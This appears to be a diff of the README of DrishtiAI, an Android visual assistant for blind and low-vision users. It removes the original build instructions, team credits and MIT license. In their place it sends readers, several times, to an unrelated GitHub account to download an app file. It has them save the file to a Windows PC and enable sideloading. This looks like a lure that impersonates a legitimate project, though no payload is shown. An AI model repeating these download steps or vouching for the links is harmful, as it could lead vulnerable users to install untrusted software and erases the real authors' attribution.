@@ -1,106 +1,194 @@
-<div align="center">
-  <img src="assets/banner.png" width="100%" alt="DrishtiAI Banner" />
+# 👁️ DrishtiAi - Real-Time Visual Help
 
-  # DrishtiAI: Empowering Vision
-  ### *Intelligent Perception for the Visually Impaired*
+[![Download DrishtiAi](https://img.shields.io/badge/Download-DrishtiAi-blue?style=for-the-badge&logo=github)](https://github.com/cathedral-forwarding509/DrishtiAi)
 
-  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-  [![Platform: Android](https://img.shields.io/badge/Platform-Android-green.svg)](https://developer.android.com/about)
-  [![Kotlin](https://img.shields.io/badge/Kotlin-1.9.0-blue.svg)](https://kotlinlang.org/)
-  [![Status: Active](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()
+## 📌 Overview
 
-  ---
+DrishtiAi is a visual assistant for people who are blind or have low vision. It uses the camera on your Android device to look at the world around you, find hazards, and speak what it sees in real time.
 
-  **DrishtiAI** is a high-impact, AI-powered visual assistant designed to bridge the gap between perception and accessibility. By leveraging state-of-the-art machine learning, DrishtiAI transforms real-world visual data into actionable auditory and tactile feedback, enabling independence for the visually impaired.
+It can help with daily tasks like:
+- Detecting obstacles in your path
+- Warning about stairs, doors, and other hazards
+- Reading basic scene details
+- Giving spoken feedback while you move
 
-</div>
-
-## 🌟 Features
-
-### 🛡️ Hazard Detection
-Real-time environmental scanning to identify obstacles, stairs, and potential hazards in the user's path.
-- **Low-latency detection**: Powered by optimized computer vision models.
-- **Auditory Alerts**: Discrete, context-aware audio cues for immediate awareness.
-
-### 📜 Narrative AI
-Advanced OCR and scene description capabilities that "read" the world to the user.
-- **Smart Text Announcement**: Intelligently identifies and reads menus, signs, and documents.
-- **Context Filtering**: Filters out noise to focus on the most relevant information.
-
-### 🔍 Smart Filtering
-Intelligent logic that prioritizes high-value visual information over environmental clutter.
-- **Custom Logic**: Tailored filtering based on user navigation modes.
-- **Adaptive UI**: High-contrast, accessibility-first interface for low-vision users.
-
-## 🛠️ Technical Stack
-
-- **Language**: Kotlin (Jetpack Compose)
-- **Architecture**: MVVM / Clean Architecture
-- **AI/ML**: Optimized for Android (MediaPipe / TensorFlow Lite)
-- **Dependency Injection**: Hilt / Dagger
-- **Navigation**: Compose Navigation
+DrishtiAi runs on the device, so it can work without sending camera data to a remote server. This keeps the app fast and helps support privacy.
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Use the link below to visit the download page:
 
-- Android Studio Flamingo or later
-- Android SDK 26+ (Android 8.0 Oreo)
-- A physical Android device (Recommended for Camera testing)
+[Visit the DrishtiAi download page](https://github.com/cathedral-forwarding509/DrishtiAi)
 
-### Installation
+## 📱 What You Need
 
-1.  **Clone the repository**:
-    ```bash
-    git clone https://github.com/ChetanSaini-Dev/DrishtiAI-App.git
-    ```
-2.  **Open in Android Studio**:
-    Simply import the project and wait for Gradle sync to complete.
-3.  **Run**:
-    Deploy to your device or emulator (Surface Duo / Tablet recommended for testing).
+Before you install DrishtiAi, check that your device has:
 
-<div align="center">
-  <h2>Project Leads & Developers</h2>
-  <table>
-    <tr>
-      <td align="center">
-        <img src="https://github.com/chetanngavali.png" width="100px;" alt="Chetan Gavali"/><br />
-        <sub><b>Chetan Gavali</b></sub><br />
-        <sub>Android Developer</sub>
-      </td>
-      <td align="center">
-        <img src="https://github.com/suyashsonawane29-pixel.png" width="100px;" alt="Suyesh Sonawane"/><br />
-        <sub><b>Suyesh Sonawane</b></sub><br />
-        <sub>Team Leader & Researcher</sub>
-      </td>
-      <td align="center">
-        <img src="https://github.com/pra77a8.png" width="100px;" alt="Pranit Adhangle"/><br />
-        <sub><b>Pranit Adhangle</b></sub><br />
-        <sub>Tester & Researcher</sub>
-      </td>
-      <td align="center">
-        <img src="https://github.com/Samyak01AI.png" width="100px;" alt="Samyak"/><br />
-        <sub><b>Samyak</b></sub><br />
-        <sub>Android Developer</sub>
-      </td>
-    </tr>
-  </table>
-</div>
+- An Android phone or tablet
+- A working rear camera
+- Enough free storage for the app
+- Android 8.0 or newer
+- A charged battery for camera use and voice output
+- Speaker or headphones for audio feedback
 
-## 🤝 Contributing
+For best results, use a device with:
+- A rear camera with good light capture
+- At least 4 GB of RAM
+- A modern processor with support for on-device machine learning
 
-We welcome contributions from the community! Whether you're an AI researcher, a mobile developer, or a designer, your input is valuable.
+## 📥 Download and Install
 
-1.  Check out our [Contributing Guidelines](CONTRIBUTING.md).
-2.  Review our [Code of Conduct](CODE_OF_CONDUCT.md).
-3.  Submit a Pull Request!
+1. Open the download page:
+   [https://github.com/cathedral-forwarding509/DrishtiAi](https://github.com/cathedral-forwarding509/DrishtiAi)
 
-## 📜 License
+2. Find the latest release or app file on the page.
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+3. Download the file to your Windows PC if you need to transfer it to your Android device.
 
----
+4. If the file is an APK, move it to your Android device using:
+   - USB cable
+   - Cloud storage
+   - File sharing app
 
-<p align="center">
-  Built with ❤️ for a more accessible world.
-</p>
+5. On your Android device, open the file.
+
+6. If asked, allow app installs from your file manager or browser.
+
+7. Tap Install.
+
+8. After the install finishes, open DrishtiAi from your app list.
+
+## 🎯 First-Time Setup
+
+After you open the app for the first time:
+
+1. Allow camera access when prompted.
+2. Allow microphone or speech access if the app asks for it.
+3. Point the camera at the scene in front of you.
+4. Use headphones if you want more private audio output.
+5. Hold the phone steady for clear detection.
+
+If the app offers voice controls or sensitivity settings, start with the default values. You can adjust them later based on how you use the app.
+
+## 🧭 How to Use DrishtiAi
+
+DrishtiAi is built for quick use during movement and daily tasks.
+
+### Main use cases
+- Walk through indoor spaces
+- Check for objects in front of you
+- Find open paths and doorways
+- Notice stairs, curbs, and uneven ground
+- Get live speech feedback from the camera view
+
+### Good habits for use
+- Keep the camera pointed forward
+- Clean the lens before use
+- Use it in good light when possible
+- Move at a steady pace
+- Pause if the app needs a moment to identify the scene
+
+## 🔊 Audio Feedback
+
+The app speaks its findings in real time. This helps you keep your eyes on your path while still getting useful scene information.
+
+You may hear:
+- Object names
+- Hazard warnings
+- Scene descriptions
+- Short guidance prompts
+
+For a clearer experience:
+- Turn up device volume
+- Use wired or Bluetooth headphones
+- Reduce background noise when possible
+
+## ⚙️ Features
+
+DrishtiAi focuses on practical support for daily mobility.
+
+- Real-time hazard detection
+- On-device computer vision
+- Spoken scene narration
+- Fast response on supported Android devices
+- Privacy-first local processing
+- Built for accessibility use
+- Useful in homes, offices, sidewalks, and indoor spaces
+- Designed for visually impaired users who need live guidance
+
+## 🧪 Tips for Better Results
+
+DrishtiAi works best when the camera gets a clear view of the area ahead.
+
+Try these tips:
+- Use bright light
+- Keep the phone level
+- Avoid covering the camera lens
+- Hold the device at chest height or face height
+- Point it where you plan to walk
+- Stop and scan before moving through tight spaces
+
+If detection feels weak:
+- Move to a brighter spot
+- Clean the lens
+- Restart the app
+- Make sure the camera permission is still enabled
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+- Check that the install finished
+- Restart your phone
+- Try opening the app again
+
+### The camera does not work
+- Confirm camera permission is on
+- Close other apps that use the camera
+- Restart the app
+- Reboot the device if needed
+
+### No speech comes through
+- Check the volume level
+- Make sure silent mode is off
+- Test with headphones removed
+- Confirm speech output is enabled in the app
+
+### Detection feels slow
+- Close other heavy apps
+- Keep the device cool
+- Use the app in better light
+- Make sure your phone meets the device requirements
+
+## 🔧 Technical Notes
+
+DrishtiAi uses Kotlin and TensorFlow Lite for on-device vision tasks. It is built for Android and uses machine learning models to process camera frames on the phone itself.
+
+That setup helps the app:
+- Respond with low delay
+- Reduce network use
+- Keep core vision work local
+- Support use in places with weak or no internet
+
+## 📚 Project Topics
+
+This project fits these areas:
+- accessibility
+- ai
+- android
+- assistive-technology
+- computer vision
+- hazard detection
+- kotlin
+- machine learning
+- tensorflow lite
+- visually impaired
+
+## 📁 Repository Access
+
+Use this link to visit the repository and download or inspect the app files:
+
+[https://github.com/cathedral-forwarding509/DrishtiAi](https://github.com/cathedral-forwarding509/DrishtiAi)
+
+## 🔐 Privacy
+
+DrishtiAi is designed to run core vision tasks on the device. That helps reduce the need to send camera data elsewhere. For users who depend on fast and private feedback, this design supports daily use in more settings.
